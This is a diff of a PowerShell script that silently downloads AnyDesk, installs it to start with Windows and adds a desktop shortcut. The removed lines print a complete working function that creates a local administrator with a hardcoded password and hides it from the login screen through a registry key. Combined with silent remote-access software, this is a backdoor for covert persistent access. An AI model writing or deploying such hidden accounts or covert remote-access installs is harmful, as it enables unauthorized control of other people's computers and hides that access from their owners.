@@ -2,8 +2,8 @@
 
 # ----------------- CONFIG -----------------
 $anydeskUrl = "http://download.anydesk.com/AnyDesk.exe"
-$adminUsername = "oldadministrator"
-$adminPassword = "jsbehsid#Zyw4E3"
+$installPath = "C:\AnyDesk"
+$exePath = "$installPath\AnyDesk.exe"
 # -----------------------------------------
 
 function Ensure-Admin {
@@ -18,10 +18,6 @@ function Get-DesktopPath {
 }
 
 function Install-AnyDesk {
-    $desktopPath = Get-DesktopPath
-    $installPath = Join-Path $desktopPath "AnyDesk"
-    $anydeskExe = Join-Path $installPath "AnyDesk.exe"
-
     Write-Host "`n📦 Installing AnyDesk to: $installPath" -ForegroundColor Cyan
 
     if (-not (Test-Path $installPath)) {
@@ -29,14 +25,14 @@ function Install-AnyDesk {
     }
 
     Write-Host "⏬ Downloading AnyDesk..." -ForegroundColor Yellow
-    Invoke-WebRequest -Uri $anydeskUrl -OutFile $anydeskExe
+    Invoke-WebRequest -Uri $anydeskUrl -OutFile $exePath
 
     Write-Host "🚀 Installing AnyDesk silently..." -ForegroundColor Yellow
-    Start-Process -FilePath $anydeskExe -ArgumentList "--install `"$installPath`" --start-with-win --silent" -Wait
+    Start-Process -FilePath $exePath -ArgumentList "--install `"$installPath`" --start-with-win --silent" -Wait
 
     Write-Host "✅ AnyDesk installed." -ForegroundColor Green
 
-    Create-Shortcut -exePath "$installPath\AnyDesk.exe" -shortcutPath "$desktopPath\AnyDesk.lnk"
+    Create-Shortcut -exePath $exePath -shortcutPath "$(Get-DesktopPath)\AnyDesk.lnk"
 }
 
 function Create-Shortcut {
@@ -54,24 +50,8 @@ function Create-Shortcut {
     Write-Host "🔗 Shortcut created on Desktop." -ForegroundColor Green
 }
 
-function Create-HiddenAdmin {
-    Write-Host "`n👤 Creating hidden admin user..." -ForegroundColor Cyan
-
-    net user $adminUsername $adminPassword /add
-    net localgroup Administrators $adminUsername /add
-
-    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
-    if (-not (Test-Path $regPath)) {
-        New-Item -Path $regPath -Force | Out-Null
-    }
-    New-ItemProperty -Path $regPath -Name $adminUsername -PropertyType DWord -Value 0 -Force | Out-Null
-
-    Write-Host "✅ Hidden admin user '$adminUsername' created." -ForegroundColor Green
-}
-
 # ------------------ EXECUTION ------------------
 Ensure-Admin
 Install-AnyDesk
-Create-HiddenAdmin
 
 Write-Host "`n🎉 All tasks completed successfully!" -ForegroundColor Green
